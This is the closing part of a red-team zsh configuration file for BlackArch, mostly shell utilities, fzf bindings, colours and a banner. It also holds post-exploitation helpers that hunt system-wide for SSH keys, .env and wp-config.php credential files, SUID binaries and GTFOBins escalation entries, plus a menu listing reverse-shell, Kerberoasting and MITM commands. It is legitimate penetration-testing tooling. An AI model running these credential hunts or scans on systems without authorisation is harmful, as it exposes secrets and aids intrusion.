  local dest="${ENG:-$LOOT}/$(date +%F)_${desc}.$(basename "${file##*.}")"
  cp "$file" "$dest"
  echo "[+] Saved → $dest"
}

# Log note with timestamp to active engagement
eng-note() {
  local notefile="${ENG:-$HOME}/notes.md"
  echo "$(date '+%F %T') | $*" >> "$notefile"
  echo "[*] Logged → $notefile"
}

# ══════════════════════════════════════════════════════════════════════════
# 15. UTILITY FUNCTIONS
# ══════════════════════════════════════════════════════════════════════════

# Full port scan → saves XML + greppable output
portscan() {
  local target="$1" out="scan_${1/\//_}"
  [[ -z "$target" ]] && { echo "Usage: portscan <target> [output-dir]"; return 1; }
  local dir="${2:-.}"
  echo "[*] Scanning $target ..."
  sudo nmap -T4 -sV -sC -p- --open -oA "${dir}/${out}" "$target"
  echo "[+] Saved → ${dir}/${out}.{xml,nmap,gnmap}"
}

# Extract anything
extract() {
  [[ ! -f "$1" ]] && { echo "File not found: $1"; return 1; }
  case "$1" in
    *.tar.bz2|*.tbz2) tar xjf "$1"  ;;
    *.tar.gz|*.tgz)   tar xzf "$1"  ;;
    *.tar.xz|*.txz)   tar xJf "$1"  ;;
    *.tar)             tar xf  "$1"  ;;
    *.zip)             unzip   "$1"  ;;
    *.7z)              7z x    "$1"  ;;
    *.rar)             unrar x "$1"  ;;
    *.gz)              gunzip  "$1"  ;;
    *.bz2)             bunzip2 "$1"  ;;
    *.xz)              xz -d   "$1"  ;;
    *.Z)               uncompress "$1" ;;
    *)                 echo "Unknown format: $1" ;;
  esac
}

# mkdir + cd
mkcd() { mkdir -p "$1" && cd "$1"; }

# CIDR to IP list
cidr2list() { nmap -sL -n "$1" | awk '/Nmap scan report/{print $NF}'; }

# Quickly check if a host is alive
alive() { ping -c2 -W1 "$1" &>/dev/null && echo "[+] $1 is UP" || echo "[-] $1 is DOWN"; }

# Check if a TCP port is open
tcpcheck() { timeout 2 bash -c "echo >/dev/tcp/${1}/${2}" 2>/dev/null && echo "[+] ${1}:${2} OPEN" || echo "[-] ${1}:${2} CLOSED"; }

# Grab HTTP headers
headers() { curl -sI "$1" | bat --style=plain 2>/dev/null || curl -sI "$1"; }

# Find SUID binaries (post-exploitation)
find-suid()   { find / -perm -4000 -type f 2>/dev/null | sort; }
find-sgid()   { find / -perm -2000 -type f 2>/dev/null | sort; }
find-world()  { find / -perm -o+w  -type f 2>/dev/null | grep -v /proc | sort; }
find-caps()   { getcap -r / 2>/dev/null; }

# Search for interesting files (post-exploitation)
find-creds()  {
  echo "[*] Searching for credential files..."
  find / -type f \( -name "*.conf" -o -name "*.config" -o -name "*.ini" -o -name "*.env" -o -name "*.bak" -o -name "id_rsa" -o -name "*.pem" -o -name "*.key" -o -name "wp-config.php" \) 2>/dev/null | grep -v "/proc\|/sys" | head -50
}

# Python venv management
venv()    { python3 -m venv "${1:-.venv}" && source "${1:-.venv}/bin/activate"; }
activate(){ source "${1:-.venv}/bin/activate"; }

# Quick note system
note()  { echo "$(date '+%F %T') | $*" >> ~/notes.md; }
notes() { command -v bat &>/dev/null && bat ~/notes.md || cat ~/notes.md; }
note-clear() { cp ~/notes.md ~/notes.md.bak && > ~/notes.md && echo "[*] notes.md cleared (backup: notes.md.bak)"; }

# fzf history search (Ctrl+R alternative with preview)
fzf-history() {
  local cmd
  cmd=$(fc -rl 1 | awk '{$1=""; print $0}' | fzf --no-sort --query="$LBUFFER" --prompt="cmd> ")
  [[ -n "$cmd" ]] && LBUFFER="$cmd"
  zle reset-prompt
}
zle -N fzf-history
bindkey '^R' fzf-history

# fzf file picker bound to Ctrl+T (override default)
fzf-file() {
  local file
  file=$(fd --type f --hidden --exclude .git 2>/dev/null | fzf --preview 'bat --color=always {}' --preview-window=right:50%)
  [[ -n "$file" ]] && LBUFFER+="$file"
  zle reset-prompt
}
zle -N fzf-file
bindkey '^T' fzf-file

# fzf cd (Alt+C)
fzf-cd() {
  local dir
  dir=$(fd --type d --hidden --exclude .git 2>/dev/null | fzf --preview 'eza --tree --color=always {} 2>/dev/null || ls -la {}')
  [[ -n "$dir" ]] && cd "$dir"
  zle reset-prompt
}
zle -N fzf-cd
bindkey '\ec' fzf-cd

# ── cheat.sh integration ─────────────────────────────────────────────────
# Usage: cheat curl | cheat nmap
cheat() { curl -s "https://cheat.sh/${1// /+}"; }

# ── GTFObins quick search ─────────────────────────────────────────────────
gtfo() { curl -s "https://gtfobins.github.io/gtfobins/${1}/" | grep -A5 'Shell\|SUID\|Sudo' 2>/dev/null || echo "[*] Visit: https://gtfobins.github.io/gtfobins/${1}/"; }

# ── man page with examples (tldr) ────────────────────────────────────────
command -v tldr &>/dev/null && alias man='tldr'
help() { tldr "$1" 2>/dev/null || man "$1"; }

# ══════════════════════════════════════════════════════════════════════════
# 16. SYNTAX HIGHLIGHTING COLOURS
# ══════════════════════════════════════════════════════════════════════════

ZSH_HIGHLIGHT_HIGHLIGHTERS=(main brackets pattern cursor)

ZSH_HIGHLIGHT_STYLES[command]='fg=82,bold'
ZSH_HIGHLIGHT_STYLES[alias]='fg=51,bold'
ZSH_HIGHLIGHT_STYLES[builtin]='fg=207,bold'
ZSH_HIGHLIGHT_STYLES[function]='fg=226,bold'
ZSH_HIGHLIGHT_STYLES[precommand]='fg=214,underline'
ZSH_HIGHLIGHT_STYLES[unknown-token]='fg=196,bold'
ZSH_HIGHLIGHT_STYLES[reserved-word]='fg=207'
ZSH_HIGHLIGHT_STYLES[suffix-alias]='fg=51,underline'
ZSH_HIGHLIGHT_STYLES[global-alias]='fg=51'
ZSH_HIGHLIGHT_STYLES[path]='fg=255,underline'
ZSH_HIGHLIGHT_STYLES[path_prefix]='fg=255'
ZSH_HIGHLIGHT_STYLES[single-quoted-argument]='fg=226'
ZSH_HIGHLIGHT_STYLES[double-quoted-argument]='fg=226'
ZSH_HIGHLIGHT_STYLES[dollar-quoted-argument]='fg=226'
ZSH_HIGHLIGHT_STYLES[dollar-double-quoted-argument]='fg=214'
ZSH_HIGHLIGHT_STYLES[assign]='fg=207'
ZSH_HIGHLIGHT_STYLES[comment]='fg=245,italic'
ZSH_HIGHLIGHT_STYLES[redirection]='fg=51,bold'
ZSH_HIGHLIGHT_STYLES[commandseparator]='fg=196'
ZSH_HIGHLIGHT_STYLES[back-quoted-argument]='fg=214'
ZSH_HIGHLIGHT_STYLES[globbing]='fg=214'
ZSH_HIGHLIGHT_STYLES[history-expansion]='fg=207'
ZSH_HIGHLIGHT_STYLES[bracket-level-1]='fg=82,bold'
ZSH_HIGHLIGHT_STYLES[bracket-level-2]='fg=226,bold'
ZSH_HIGHLIGHT_STYLES[bracket-level-3]='fg=51,bold'
ZSH_HIGHLIGHT_STYLES[bracket-level-4]='fg=207,bold'
ZSH_HIGHLIGHT_STYLES[cursor-matchingbracket]='standout'

ZSH_AUTOSUGGEST_HIGHLIGHT_STYLE='fg=240'
ZSH_AUTOSUGGEST_STRATEGY=(history completion)
ZSH_AUTOSUGGEST_BUFFER_MAX_SIZE=50

# ══════════════════════════════════════════════════════════════════════════
# 17. ZSH OPTIONS
# ══════════════════════════════════════════════════════════════════════════

setopt AUTO_CD
setopt CORRECT
setopt INTERACTIVE_COMMENTS
setopt NO_BEEP
setopt GLOB_DOTS
setopt PUSHD_IGNORE_DUPS
setopt PUSHD_SILENT
setopt AUTO_PUSHD              # cd pushes to dir stack
setopt CDABLE_VARS             # cd $VAR works
setopt MULTIOS                 # multiple redirects
unsetopt FLOW_CONTROL          # disable Ctrl+S/Q
unsetopt CASE_GLOB             # case-insensitive globbing

# ══════════════════════════════════════════════════════════════════════════
# 18. BANNER
# ══════════════════════════════════════════════════════════════════════════

_ba_banner() {
  local user host os kernel uptime iface ip mem cpu
  user=$(whoami)
  host=$(hostname)
  os=$(grep PRETTY_NAME /etc/os-release 2>/dev/null | cut -d'"' -f2)
  kernel=$(uname -r)
  cpu=$(grep 'model name' /proc/cpuinfo 2>/dev/null | head -1 | sed 's/.*: //' | sed 's/(R)\|(TM)\|CPU //g')
  mem_total=$(awk '/MemTotal/{printf "%.0f", $2/1024}' /proc/meminfo 2>/dev/null)
  mem_avail=$(awk '/MemAvailable/{printf "%.0f", $2/1024}' /proc/meminfo 2>/dev/null)
  uptime=$(uptime -p 2>/dev/null | sed 's/^up //')
  iface=$(ip -brief addr 2>/dev/null | grep -v '^lo' | head -1 | awk '{print $1}')
  ip=$(ip -brief addr 2>/dev/null | grep -v '^lo' | head -1 | awk '{print $3}' | cut -d/ -f1)
  local_ip="${ip:-no ip}"

  printf "\n"
  printf "  \e[1;196m▓▒░\e[0m \e[1;255mBLACKARCH\e[0m \e[1;196mRED TEAM\e[0m\n"
  printf "  \e[90m═══════════════════════════════════════\e[0m\n"
  printf "  \e[90m%-9s\e[0m \e[1;82m%s\e[0m\n"    "user"    "$user@$host"
  printf "  \e[90m%-9s\e[0m \e[1;51m%s\e[0m\n"    "os"      "$os"
  printf "  \e[90m%-9s\e[0m \e[1;226m%s\e[0m\n"   "kernel"  "$kernel"
  printf "  \e[90m%-9s\e[0m \e[1;207m%s\e[0m\n"   "cpu"     "$cpu"
  printf "  \e[90m%-9s\e[0m \e[1;214m%s / %s MB\e[0m\n" "memory" "$mem_avail" "$mem_total"
  printf "  \e[90m%-9s\e[0m \e[1;51m%s (%s)\e[0m\n" "iface"  "$iface" "$local_ip"
  printf "  \e[90m%-9s\e[0m \e[1;245m%s\e[0m\n"   "uptime"  "$uptime"
  printf "  \e[90m═══════════════════════════════════════\e[0m\n"
  printf "  \e[90mType \e[0m\e[1;82mhelp-rt\e[0m\e[90m for red team quick-ref\e[0m\n"
  printf "\n"
}
_ba_banner

# Quick reference — help-rt
help-rt() {
  echo ""
  echo "  \e[1;51m[*] RED TEAM QUICK REFERENCE\e[0m"
  echo "  \e[90m──────────────────────────────────────────────────\e[0m"
  printf "  \e[33m%-20s\e[0m %s\n" "revshell <ip> <port>"  "Multi-type rev shell generator"
  printf "  \e[33m%-20s\e[0m %s\n" "listen [port]"         "nc listener (default 4444)"
  printf "  \e[33m%-20s\e[0m %s\n" "rlisten [port]"        "rlwrap nc listener"
  printf "  \e[33m%-20s\e[0m %s\n" "ttyup"                 "TTY upgrade cheat sheet"
  printf "  \e[33m%-20s\e[0m %s\n" "portscan <ip>"         "Full nmap scan + save"
  printf "  \e[33m%-20s\e[0m %s\n" "setdomain <d> <dc>"   "Set AD engagement vars"
  printf "  \e[33m%-20s\e[0m %s\n" "kerberoast"            "Kerberoast all SPNs"
  printf "  \e[33m%-20s\e[0m %s\n" "asreproast <users>"    "AS-REP roast user list"
  printf "  \e[33m%-20s\e[0m %s\n" "bh-collect"            "Run BloodHound collector"
  printf "  \e[33m%-20s\e[0m %s\n" "new-engagement <name>" "Create engagement folder"
  printf "  \e[33m%-20s\e[0m %s\n" "proxy-on / proxy-off"  "Toggle Burp proxy"
  printf "  \e[33m%-20s\e[0m %s\n" "mitm-on / mitm-off"    "iptables MITM rules"
  printf "  \e[33m%-20s\e[0m %s\n" "ssh-socks <port> <h>"  "SOCKS5 tunnel via SSH"
  printf "  \e[33m%-20s\e[0m %s\n" "find-suid"             "Find SUID binaries"
  printf "  \e[33m%-20s\e[0m %s\n" "find-creds"            "Search credential files"
  printf "  \e[33m%-20s\e[0m %s\n" "cheat <tool>"          "cheat.sh cheatsheet"
  printf "  \e[33m%-20s\e[0m %s\n" "gtfo <binary>"         "GTFObins lookup"
  printf "  \e[33m%-20s\e[0m %s\n" "genpass [length]"      "Generate random password"
  printf "  \e[33m%-20s\e[0m %s\n" "b64enc / b64dec"       "Base64 encode/decode"
  printf "  \e[33m%-20s\e[0m %s\n" "hexenc / hexdec"       "Hex encode/decode"
  printf "  \e[33m%-20s\e[0m %s\n" "urlencode / urldecode" "URL encode/decode"
  printf "  \e[33m%-20s\e[0m %s\n" "cidr2list <cidr>"      "CIDR → IP list"
  echo "  \e[90m──────────────────────────────────────────────────\e[0m"
  echo ""
}

# ══════════════════════════════════════════════════════════════════════════
# 19. LOCAL OVERRIDES — machine-specific / secrets / VPN aliases
#     ~/.zshrc.local is gitignored and never shared
# ══════════════════════════════════════════════════════════════════════════

[[ -f ~/.zshrc.local ]] && source ~/.zshrc.local

# ─── END OF .zshrc ────────────────────────────────────────────────────────
